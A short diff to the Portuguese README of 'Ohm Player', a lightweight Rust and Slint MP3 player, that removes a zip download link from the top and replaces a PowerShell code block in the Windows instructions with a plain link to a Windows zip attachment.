@@ -1,4 +1,4 @@
-[ohm-player-windows.zip](https://github.com/user-attachments/files/30683303/ohm-player-windows.zip)
+
 # Ohm Player
 
 Um player de MP3 nativo, leve e multiplataforma, feito em **Rust** com **Slint UI**.
@@ -46,10 +46,8 @@ SLINT_BACKEND=winit-software cargo run
 
 No Windows, você também pode usar o script incluso:
 
-```powershell
-@[ohm-player-windows.zip](https://github.com/user-attachments/files/30683311/ohm-player-windows.zip)
+[ohm-player-windows.zip](https://github.com/user-attachments/files/30683303/ohm-player-windows.zip)
 
-```
 
 Ou dar duplo clique em `Ohm Player.cmd`.
 
